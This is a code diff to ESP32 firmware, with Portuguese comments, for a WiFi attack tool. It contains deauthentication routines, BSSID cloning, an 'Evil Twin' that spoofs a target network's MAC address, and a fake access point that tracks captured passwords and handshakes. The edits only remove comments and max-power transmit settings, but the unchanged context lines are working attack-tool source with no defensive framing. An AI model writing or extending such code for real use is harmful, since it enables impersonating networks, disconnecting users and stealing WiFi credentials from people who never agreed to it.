@@ -5,7 +5,6 @@
 #include <esp_wifi.h>
 #include "config.h"
 
-// Forward declaration para evitar erro de compilação
 void stopEvilTwin();
 
 static uint32_t deauthPacketCount = 0;
@@ -217,7 +216,6 @@ static void startBssidClone(uint8_t networkIndex) {
     delay(200);
 
     bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
 
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
@@ -238,7 +236,6 @@ static void restartBssidClone() {
     esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
     delay(100);
     bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
         esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
@@ -295,9 +292,7 @@ void stopDeauth() {
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // ==========================================
     // AUTO-STOP DO EVIL TWIN
-    // ==========================================
     if (evilTwinActive) {
         if (WiFi.softAPgetStationNum() > 0) {
             Serial.println("[EvilTwin] Cliente conectou! Capturando handshake e voltando para CrazyCat...");
@@ -343,7 +338,6 @@ bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }
 void startFakeAP(const char* ssid) {
     WiFi.mode(WIFI_AP);
     WiFi.softAP(ssid, "12345678", 1, 0, 8);
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
     fakeAPEnabled = true;
     passwordCaptured = false;
 }
@@ -401,7 +395,6 @@ void startEvilTwin(uint8_t networkIndex) {
     delay(200);
 
     bool apOk = WiFi.softAP(cloneSSID, "password123", cloneChannel, 0, 8);
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
 
     if (!apOk) {
         evilTwinActive = false;
